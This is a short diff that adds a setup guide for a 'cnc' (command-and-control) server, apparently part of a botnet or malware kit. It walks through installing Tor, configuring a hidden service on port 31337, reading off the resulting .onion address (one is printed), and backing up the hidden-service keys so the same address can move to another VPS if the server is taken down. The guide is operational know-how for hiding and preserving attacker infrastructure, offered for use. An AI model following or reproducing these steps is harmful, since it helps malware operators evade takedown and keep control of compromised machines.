@@ -1,0 +1,32 @@
+Setting up the cnc
+
+1: install needed stuff
+sudo apt-get install libmysqlclient-dev tor -y
+
+2: edit tor config
+nano /etc/tor/torrc
+
+un comment these 2 lines and chane 80 to your cnc port
+
+#HiddenServiceDir /var/lib/tor/hidden_service/
+#HiddenServicePort 80 127.0.0.1:80
+
+so it would look like
+
+HiddenServiceDir /var/lib/tor/hidden_service/
+HiddenServicePort 31337 127.0.0.1:31337
+
+save the file and restart tor
+
+3: get your hidden service
+
+cat /var/lib/tor/hidden_service/hostname
+
+should return a .onion
+rbhfryuog5fvbasyo3rwqnf4gwrupell7o7ikydb4zdl4v6e2oozfkid.onion
+
+4: backup your tor hidden service
+
+save the full folder /var/lib/tor/hidden_service/ (all its contents) so that
+if your cnc box goes down you can reuse the same hidden service on an other
+vps (like domain)
